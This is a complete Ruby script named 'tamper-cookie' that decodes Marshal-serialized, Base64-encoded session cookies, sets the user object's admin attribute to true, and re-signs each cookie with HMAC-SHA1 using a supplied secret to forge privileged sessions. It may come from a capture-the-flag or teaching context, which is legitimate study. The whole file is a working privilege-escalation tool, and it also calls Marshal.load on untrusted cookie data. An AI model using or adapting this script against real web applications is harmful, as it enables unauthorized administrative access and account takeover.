require 'uri'
require 'pp'
require 'base64'
require 'openssl'
require 'data_mapper'

DataMapper.setup(:default, 'sqlite3::memory')

class User
    attr_accessor :admin
end

def generate_hmac(data, secret)
    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

def encode_object(obj, secret)
    obj["user"].admin = true

    data = Base64.encode64(Marshal.dump(obj))

    signature = generate_hmac(data, secret)

    return URI.encode(data).gsub("=", "%3D") + "--" + signature
end

def decode_cookie(c)
    cookie = c.split("--")

    obj = Marshal.load(Base64.decode64(URI.decode(cookie[0])))

    return obj
end

def main
    if ARGV.length != 2
        puts('usage: tamper-cookie <file> <secret-word>')
        return 1
    end

    cookies = IO.readlines(ARGV[0], chomp:true)

    for cookie in cookies
        obj = decode_cookie(cookie)
        puts("Decoded Cookie:\n")
        pp obj

        new_cookie = encode_object(obj, ARGV[1])
        puts("\nTampered Cookie:\n")
        puts(new_cookie)
    end
    return 0
end

main

    